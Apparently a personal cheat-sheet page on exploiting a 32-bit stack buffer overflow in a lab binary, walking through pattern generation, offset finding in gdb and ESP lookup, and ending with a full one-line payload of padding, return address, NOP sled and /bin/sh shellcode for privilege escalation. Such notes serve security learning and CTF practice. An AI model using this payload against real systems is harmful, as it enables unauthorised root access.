---
title: "Buffer Overflow"
permalink: /Buffer_Overflow/
layout: single
author-profile: true
---

You need to know:
- Size of the buffer
- Memory address of ESP
- Shellcode

Generate a pattern of 300 characters: https://github.com/Svenito/exploit-pattern
`./pattern create 300`

Copy and paste as input into the binary while running the program in gdb

This comes us with segmentation fault as it wrote into memory which shouldn't be written into.
Take the memory address and paste into pattern.py, this tells you the size of the buffer
`./pattern offset 0x6a413969`

While still in gd, to get the location of the ESP, run: 
`i r esp`    

Now get shellcode : www.shell-storm.org/shellcode

With shellcode in hand, I now have the three components I need to craft my buffer overflow. My template looks like this now:
`(Binary)(Print ‘A’s to the size of buffer until EIP)+(ESP Location in reverse) + (NOP sled) + (Shellcode)`
The payload ends up being this:
```
./r00t $(python -c ‘print “A”*268 + “\x70\xfb\xff\xbf” + “\x90” * 10 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80″‘)
```
Run payload and privileges are escalated.
